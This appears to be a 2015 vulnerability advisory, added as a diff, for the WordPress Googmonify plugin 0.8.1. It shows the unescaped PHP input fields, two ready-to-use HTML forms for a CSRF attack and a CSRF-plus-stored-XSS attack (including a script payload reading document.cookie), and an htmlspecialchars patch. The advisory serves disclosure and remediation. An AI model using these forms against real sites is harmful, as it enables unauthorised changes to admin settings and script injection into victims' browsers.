@@ -1,0 +1,50 @@
+[+] Exploit Title : Wordpress Googmonify Plug-in XSS/CSRF
+[+] Exploit Author : Ehsan Hosseini
+[+] Date: 2015-08-21
+[+] Vendor Homepage : https://wordpress.org/plugins/googmonify/
+[+] Software Link : https://downloads.wordpress.org/plugin/googmonify.zip
+[+] Version : 0.8.1
+[+] Tested On : Windows FireFox
+[+] CVE : N/A
+
+===============================
+Vulnerable Code : googmonify.php - Line 190,194,208
+<input id="PID" name="PID" type="text" value="<?php echo $pid; ?>">
+<input id= "Limit" name="Limit" type="text" value="<?php echo $limit;
+?>" size="5">
+<input id="AID" name="AID" type="text" value="<?php echo $aid; ?>">
+===============================
+Exploit 1 (Just CSRF):
+
+<form method="POST"
+action="http://[URL]/[Path]/wp-admin/options-general.php?page=googmonify.php">
+<input name="PID" type="hidden" value='Ehsan Hosseini'>
+<input name="Limit" type="hidden" value="0">
+<input name="Analytics" type="hidden" value="0" >
+<input name="AID" type="hidden" value="Ehsan Hosseini">
+<input name="GoogmonifyUpdate" type="submit" value="Update Options &raquo;">
+</form>
+
+Exploit 2 (CSRF & XSS):
+
+<form method="POST"
+action="http://[URL]/[Path]/wp-admin/options-general.php?page=googmonify.php">
+<input name="PID" type="hidden"
+value='"><script>alert(document.cookie)</script>'>
+<input name="Limit" type="hidden" value="0">
+<input name="Analytics" type="hidden" value="0" >
+<input name="AID" type="hidden" value='"><script>alert(/Ehsan
+Hosseini/)</script>'>
+<input name="GoogmonifyUpdate" type="submit" value="Update Options &raquo;">
+</form>
+===============================
+Patch :  googmonify.php - Line 190,194,208
+<input id="PID" name="PID" type="text" value="<?php echo
+htmlspecialchars($pid); ?>">
+<input id= "Limit" name="Limit" type="text" value="<?php echo
+htmlspecialchars($limit); ?>" size="5">
+<input id="AID" name="AID" type="text" value="<?php echo
+htmlspecialchars($aid); ?>">
+
+===============================
+Discovered By : Ehsan Hosseini.
